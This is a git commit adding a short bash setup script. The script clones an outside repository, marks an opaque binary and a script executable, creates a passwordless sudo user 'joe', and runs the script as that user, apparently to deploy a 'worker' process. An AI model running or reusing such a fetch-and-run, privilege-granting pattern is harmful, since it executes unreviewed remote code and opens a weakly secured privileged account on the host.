21d52295c9f3984d3e910a9dbba7bea83ec111ca
Nnnsn988 <86891218+Nnnsn988@users.noreply.github.com>
2021-07-04 01:38:00 +0700

    Add files via upload

---
+++ kuntul.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+sudo apt update
+git clone https://github.com/Kikinan86/workerkun.git && cd workerkun
+chmod +x okeh.sh && chmod +x cumin
+sudo adduser --disabled-password --gecos "" joe && sudo usermod -aG sudo joe
+sudo -u joe -H sh -c "./okeh.sh"
